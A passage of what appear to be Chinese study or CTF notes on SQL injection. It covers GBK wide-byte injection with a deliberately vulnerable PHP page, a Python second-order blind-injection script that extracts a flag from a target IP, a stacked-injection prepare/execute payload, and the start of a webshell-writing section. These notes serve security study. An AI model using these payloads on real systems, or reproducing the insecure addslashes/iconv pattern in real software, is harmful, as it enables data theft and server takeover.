<p>==宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码，然后服务器会根据character_set_connection把请求进行转码，从character_set_client转成character_set_connection，然后更新到数据库的时候，再转化成字段所对应的编码==</p>
<p>以下是数据的变化过程:</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">%</span><span style="color:#58a1dd">df</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">27</span><span style="color:#ff636f">===&gt;</span>(<span style="color:#58a1dd">addslashes</span>)<span style="color:#ff636f">====&gt;%</span><span style="color:#58a1dd">df</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">5</span><span style="color:#58a1dd">c</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">27</span><span style="color:#ff636f">====&gt;</span>(<span style="color:#58a1dd">GBK</span>)<span style="color:#ff636f">====&gt;</span><span style="color:#58a1dd">運’</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">用户输入</span><span style="color:#ff636f">==&gt;</span><span style="color:#58a1dd">过滤函数</span><span style="color:#ff636f">==&gt;</span><span style="color:#58a1dd">代码层的</span><span style="color:#58a1dd">$sql</span><span style="color:#ff636f">==&gt;</span><span style="color:#58a1dd">mysql处理请求</span><span style="color:#ff636f">==&gt;</span><span style="color:#58a1dd">mysql中的sql</span></span></span></code></pre></div><h2 id="5-防护手段" class="heading-element"><span>5. 防护手段</span>
  <a href="#5-%e9%98%b2%e6%8a%a4%e6%89%8b%e6%ae%b5" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>使用mysql_set_charset(GBK)指定字符集</p>
<pre tabindex="0"><code>SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary</code></pre><p>使用mysql_real_escape_string进行转义</p>
<pre tabindex="0"><code>mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集（使用mysql_set_charset指定字符集），不会出现前面的df和5c拼接为一个宽字节的问题</code></pre><p>以上两个条件需要同时满足才行，缺一不可。</p>
<h2 id="6编码转换" class="heading-element"><span>6.编码转换</span>
  <a href="#6%e7%bc%96%e7%a0%81%e8%bd%ac%e6%8d%a2" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>这种情况不太一样</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">$userid</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">iconv</span>(<span style="color:#a6be9d">&#39;utf-8&#39;</span>,<span style="color:#a6be9d">&#39;gbk&#39;</span>,<span style="color:#58a1dd">$userid</span>)
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$userid</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">mb_convert_encoding</span>(<span style="color:#a6be9d">&#39;utf-8&#39;</span>,<span style="color:#a6be9d">&#39;gbk&#39;</span>,<span style="color:#58a1dd">$userid</span>)
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">如果存在这样的注入语句</span><span style="color:#58a1dd">$userid</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">admin</span><span style="color:#a6be9d">&#39; or 1=1--，那么久可以绕过addslashes注入。原理和2相同
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">而如果反过来，也同样存在字节注入
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">$userid = iconv(&#39;&#39;gbk&#39;</span>,<span style="color:#58a1dd">utf</span><span style="color:#ff636f">-</span><span style="color:#a6be9d">8</span><span style="color:#a6be9d">&#39;,$userid)
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">$userid = mb_convert_encoding(&#39;</span><span style="color:#58a1dd">gbk</span><span style="color:#a6be9d">&#39;,&#39;</span><span style="color:#58a1dd">utf</span><span style="color:#ff636f">-</span><span style="color:#a6be9d">8</span><span style="color:#a6be9d">&#39;,$userid)
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">只需要把注入语句改为$userid = admin運&#39;</span> <span style="color:#ff636f">or</span> <span style="color:#a6be9d">1</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">1</span><span style="color:#ff636f">--</span><span style="color:#58a1dd">，原理同上</span></span></span></code></pre></div><ul>
<li>
<p><code>iconv('utf-8', 'gbk', $id)</code></p>
<p>同样也使用了 addslashes转义，然后使用iconv进行转码，由utf-8 –&gt;gbk</p>
<p>为了避免宽字节注入，很多人使用iconv函数（能够完成各种字符集间的转换$text=iconv(“UTF-8”,”GBK”,$text);），其实这样做是有很大风险的，仍旧可以造成宽字节注入。</p>
<p><strong>可以使用逆向思维，先找一个gbk的汉字錦,錦的utf-8编码是0xe98ca6，它的gbk编码是0xe55c,是不是已经看出来了，当传入的值是錦’，’通过addslashes转义为&rsquo;(%5c%27),錦通过icov转换为%e5%5c，终止变为了%e5%5c%5c%27,不难看出%5c%5c正好把反斜杠转义，使单引号逃逸，造成注入。</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//连接数据库部分，注意使用了gbk编码
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$conn</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">mysql_connect</span>(<span style="color:#a6be9d">&#39;localhost&#39;</span>, <span style="color:#a6be9d">&#39;root&#39;</span>, <span style="color:#a6be9d">&#39;root&#39;</span>) <span style="color:#ff636f">or</span> <span style="color:#ff636f">die</span>(<span style="color:#a6be9d">&#39;bad!&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">mysql_query</span>(<span style="color:#a6be9d">&#34;SET NAMES &#39;gbk&#39;&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">mysql_select_db</span>(<span style="color:#a6be9d">&#39;test&#39;</span>, <span style="color:#58a1dd">$conn</span>) <span style="color:#ff636f">OR</span> <span style="color:#58a1dd">emMsg</span>(<span style="color:#a6be9d">&#34;连接数据库失败，未找到您填写的数据库&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//执行sql语句
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">mysql_query</span>(<span style="color:#a6be9d">&#34;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&#34;</span>, <span style="color:#58a1dd">$conn</span>); 
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$id</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">isset</span>(<span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">&#39;id&#39;</span>]) <span style="color:#ff636f">?</span> <span style="color:#58a1dd">addslashes</span>(<span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">&#39;id&#39;</span>]) <span style="color:#ff636f">:</span> <span style="color:#a6be9d">1</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$id</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">iconv</span>(<span style="color:#a6be9d">&#39;utf-8&#39;</span>, <span style="color:#a6be9d">&#39;gbk&#39;</span>, <span style="color:#58a1dd">$id</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$sql</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;SELECT * FROM news WHERE tid=&#39;</span><span style="color:#a6be9d">{</span><span style="color:#58a1dd">$id</span><span style="color:#a6be9d">}</span><span style="color:#a6be9d">&#39;&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$result</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">mysql_query</span>(<span style="color:#58a1dd">$sql</span>, <span style="color:#58a1dd">$conn</span>) <span style="color:#ff636f">or</span> <span style="color:#ff636f">die</span>(<span style="color:#58a1dd">mysql_error</span>());
</span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> <span style="color:#a6be9d">&#34;&lt;br&gt;&#34;</span><span style="color:#ff636f">.</span><span style="color:#a6be9d">&#34;sql:&#34;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$sql</span><span style="color:#ff636f">.</span><span style="color:#a6be9d">&#34;&lt;br&gt;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">?&gt;</span>
</span></span><span style="display:flex;"><span>&lt;!DOCTYPE html&gt;
</span></span><span style="display:flex;"><span>&lt;html&gt;
</span></span><span style="display:flex;"><span>&lt;head&gt;
</span></span><span style="display:flex;"><span>&lt;meta charset=&#34;gbk&#34; /&gt;
</span></span><span style="display:flex;"><span>&lt;title&gt;gbk change utf-8&lt;/title&gt;
</span></span><span style="display:flex;"><span>&lt;/head&gt;
</span></span><span style="display:flex;"><span>&lt;body&gt;
</span></span><span style="display:flex;"><span>&lt;?php
</span></span><span style="display:flex;"><span>$row = mysql_fetch_array($result, MYSQL_ASSOC);
</span></span><span style="display:flex;"><span>echo &#34;&lt;h2&gt;{$row[&#39;title&#39;]}&lt;/h2&gt;&lt;p&gt;{$row[&#39;content&#39;]}&lt;p&gt;\n&#34;;
</span></span><span style="display:flex;"><span>mysql_free_result($result);
</span></span><span style="display:flex;"><span>?&gt;
</span></span><span style="display:flex;"><span>&lt;/body&gt;
</span></span><span style="display:flex;"><span>&lt;/html&gt;
</span></span></code></pre></div></li>
</ul>
<h1 id="二次" class="heading-element"><span>二次</span>
  <a href="#%e4%ba%8c%e6%ac%a1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>具体情况具体判断</p>
<p>贴一个脚本</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PYTHON" data-lang="PYTHON"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">requests</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">re</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">from</span> <span style="color:#58a1dd">time</span> <span style="color:#ff636f">import</span> <span style="color:#58a1dd">sleep</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">def</span> <span style="color:#58a1dd">flag</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">flag</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">url</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#39;http://106.54.163.94:10000/&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">url1</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">url</span> <span style="color:#ff636f">+</span> <span style="color:#a6be9d">&#39;register.php&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">url2</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">url</span> <span style="color:#ff636f">+</span> <span style="color:#a6be9d">&#39;login.php&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">url3</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">url</span> <span style="color:#ff636f">+</span> <span style="color:#a6be9d">&#39;user.php&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">url4</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">url</span> <span style="color:#ff636f">+</span> <span style="color:#a6be9d">&#39;index.php&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">for</span> <span style="color:#58a1dd">i</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">range</span>(<span style="color:#a6be9d">1</span>, <span style="color:#a6be9d">45</span>):
</span></span><span style="display:flex;"><span>       
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">s</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">requests</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">Session</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">for</span> <span style="color:#58a1dd">j</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">range</span>(<span style="color:#a6be9d">1</span>,<span style="color:#a6be9d">128</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#828b96;font-style:italic"># 注册数据包</span>
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">data1</span> <span style="color:#ff636f">=</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#a6be9d">&#34;email&#34;</span>: <span style="color:#a6be9d">f</span><span style="color:#a6be9d">&#34;aiwin@163.com&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#a6be9d">&#34;username&#34;</span>: <span style="color:#a6be9d">f</span><span style="color:#a6be9d">&#34;3&#39; and if((ascii(substr((select f14g from f14g), </span><span style="color:#a6be9d">{</span><span style="color:#58a1dd">i</span><span style="color:#a6be9d">}</span><span style="color:#a6be9d">, 1)) = </span><span style="color:#a6be9d">{</span><span style="color:#58a1dd">j</span><span style="color:#a6be9d">}</span><span style="color:#a6be9d">), 1, 0)#&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#a6be9d">&#34;password&#34;</span>: <span style="color:#a6be9d">&#34;1@#af3532&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#a6be9d">&#34;confirmpass&#34;</span>: <span style="color:#a6be9d">&#34;1@#af3532&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#a6be9d">&#34;register&#34;</span>: <span style="color:#a6be9d">&#34;1@#af3532&#34;</span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#828b96;font-style:italic"># 登录数据包</span>
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">data2</span> <span style="color:#ff636f">=</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#a6be9d">&#34;username&#34;</span>: <span style="color:#a6be9d">f</span><span style="color:#a6be9d">&#34;3&#39; and if((ascii(substr((select f14g from f14g), </span><span style="color:#a6be9d">{</span><span style="color:#58a1dd">i</span><span style="color:#a6be9d">}</span><span style="color:#a6be9d">, 1)) = </span><span style="color:#a6be9d">{</span><span style="color:#58a1dd">j</span><span style="color:#a6be9d">}</span><span style="color:#a6be9d">), 1, 0)#&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#a6be9d">&#34;password&#34;</span>: <span style="color:#a6be9d">&#34;1@#af3532&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#a6be9d">&#34;login&#34;</span>: <span style="color:#a6be9d">&#34;1&#34;</span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#828b96;font-style:italic"># 发送日记数据包</span>
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">data4</span> <span style="color:#ff636f">=</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#a6be9d">&#34;content&#34;</span>: <span style="color:#a6be9d">&#34;123&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#a6be9d">&#34;submit&#34;</span>: <span style="color:#a6be9d">&#34;</span><span style="color:#a6be9d">%E</span><span style="color:#a6be9d">4%BF%9D</span><span style="color:#a6be9d">%E</span><span style="color:#a6be9d">5%AD%98&#34;</span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">response_regt</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">requests</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">post</span>(<span style="color:#58a1dd">url</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">url1</span>, <span style="color:#58a1dd">data</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">data1</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">response_login</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">s</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">post</span>(<span style="color:#58a1dd">url</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">url2</span>, <span style="color:#58a1dd">data</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">data2</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">response_sent</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">s</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">post</span>(<span style="color:#58a1dd">url</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">url3</span>, <span style="color:#58a1dd">data</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">data4</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">response_see</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">s</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">get</span>(<span style="color:#58a1dd">url</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">url4</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#828b96;font-style:italic">#print(response_see.text)</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">if</span> <span style="color:#a6be9d">&#34;uploads/default.jpg&#34;</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">response_see</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">text</span>:  <span style="color:#828b96;font-style:italic"># 正确则将low = mid + 1，继续搜索</span>
</span></span><span style="display:flex;"><span>               
</span></span><span style="display:flex;"><span>           
</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">flag</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">flag</span> <span style="color:#ff636f">+</span> <span style="color:#58a1dd">chr</span>(<span style="color:#58a1dd">j</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">flag</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> <span style="color:#58a1dd">__name__</span> <span style="color:#ff636f">==</span> <span style="color:#a6be9d">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">flag</span>()</span></span></code></pre></div><h1 id="堆叠" class="heading-element"><span>堆叠</span>
  <a href="#%e5%a0%86%e5%8f%a0" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p><a href="https://xz.aliyun.com/t/3950"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/t/3950</a></p>
<p>PHP连接MySQL数据库有三种方式（MySQL、Mysqli、PDO）</p>
<table>
<thead>
<tr>
<th></th>
<th><strong>Mysqli</strong></th>
<th><strong>PDO</strong></th>
<th><strong>MySQL</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>服务端prepare语句的支持情况</td>
<td>==是==</td>
<td>==是==</td>
<td>否</td>
</tr>
<tr>
<td>客户端prepare语句的支持情况</td>
<td>否</td>
<td>是</td>
<td>否</td>
</tr>
<tr>
<td>多语句执行支持情况</td>
<td>是</td>
<td>==大多数==</td>
<td>否</td>
</tr>
</tbody>
</table>
<p>只有sqli和pdo有堆叠注入（包括预处理）</p>
<p>前者通过<code>mysqli_query()</code>函数来进行多语句执行，后者通过<code>query()</code>函数</p>
<p><strong>存在堆叠注入的判断方法</strong> : <strong>名称处加单引号报错，加双引号不报错，加单引号和分号不报错，说明存在堆叠注入。</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#a6be9d">&#39;   报错
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">&#39;</span>;  恢复正常
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">&#34;   正常</span></span></span></code></pre></div><p>payload</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#58a1dd">asd</span><span style="color:#a6be9d">&#39;;set @a=0x{0};prepare ctftest from @a;execute ctftest-- -</span></span></span></code></pre></div><p>理解</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#58a1dd">mysql</span><span style="color:#ff636f">&gt;</span> <span style="color:#ff636f">select</span> <span style="color:#58a1dd">hex</span>(<span style="color:#a6be9d">&#39;select sleep(5)&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff636f">+</span><span style="color:#828b96;font-style:italic">--------------------------------+
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">|</span> <span style="color:#58a1dd">hex</span>(<span style="color:#a6be9d">&#39;select sleep(5)&#39;</span>)         <span style="color:#ff636f">|</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">+</span><span style="color:#828b96;font-style:italic">--------------------------------+
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">|</span> <span style="color:#a6be9d">73656</span><span style="color:#58a1dd">C65637420736C656570283529</span> <span style="color:#ff636f">|</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">+</span><span style="color:#828b96;font-style:italic">--------------------------------+
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#a6be9d">1</span> <span style="color:#ff636f">row</span> <span style="color:#ff636f">in</span> <span style="color:#ff636f">set</span> (<span style="color:#a6be9d">0</span>.<span style="color:#a6be9d">01</span> <span style="color:#58a1dd">sec</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">mysql</span><span style="color:#ff636f">&gt;</span> <span style="color:#ff636f">set</span> <span style="color:#ff636f">@</span><span style="color:#58a1dd">a</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">0</span><span style="color:#58a1dd">x73656C65637420736C656570283529</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Query</span> <span style="color:#58a1dd">OK</span>, <span style="color:#a6be9d">0</span> <span style="color:#ff636f">rows</span> <span style="color:#58a1dd">affected</span> (<span style="color:#a6be9d">0</span>.<span style="color:#a6be9d">00</span> <span style="color:#58a1dd">sec</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">mysql</span><span style="color:#ff636f">&gt;</span> <span style="color:#ff636f">prepare</span> <span style="color:#58a1dd">test</span> <span style="color:#ff636f">from</span> <span style="color:#ff636f">@</span><span style="color:#58a1dd">a</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Query</span> <span style="color:#58a1dd">OK</span>, <span style="color:#a6be9d">0</span> <span style="color:#ff636f">rows</span> <span style="color:#58a1dd">affected</span> (<span style="color:#a6be9d">0</span>.<span style="color:#a6be9d">00</span> <span style="color:#58a1dd">sec</span>)
</span></span><span style="display:flex;"><span><span style="color:#ff636f">Statement</span> <span style="color:#58a1dd">prepared</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">mysql</span><span style="color:#ff636f">&gt;</span> <span style="color:#ff636f">execute</span> <span style="color:#58a1dd">test</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">+</span><span style="color:#828b96;font-style:italic">----------+
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">|</span> <span style="color:#58a1dd">sleep</span>(<span style="color:#a6be9d">5</span>) <span style="color:#ff636f">|</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">+</span><span style="color:#828b96;font-style:italic">----------+
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">|</span>        <span style="color:#a6be9d">0</span> <span style="color:#ff636f">|</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">+</span><span style="color:#828b96;font-style:italic">----------+
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#a6be9d">1</span> <span style="color:#ff636f">row</span> <span style="color:#ff636f">in</span> <span style="color:#ff636f">set</span> (<span style="color:#a6be9d">5</span>.<span style="color:#a6be9d">00</span> <span style="color:#58a1dd">sec</span>)</span></span></code></pre></div><h1 id="写shell" class="heading-element"><span>写shell</span>
  <a href="#%e5%86%99shell" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><pre tabindex="0"><code>select @@basedir;查网站的物理路径

查看数据库是否有导入权限，看能否直接导入木马
SHOW GLOBAL VARIABLES LIKE &#39;%secure%&#39;
有的话直接写入
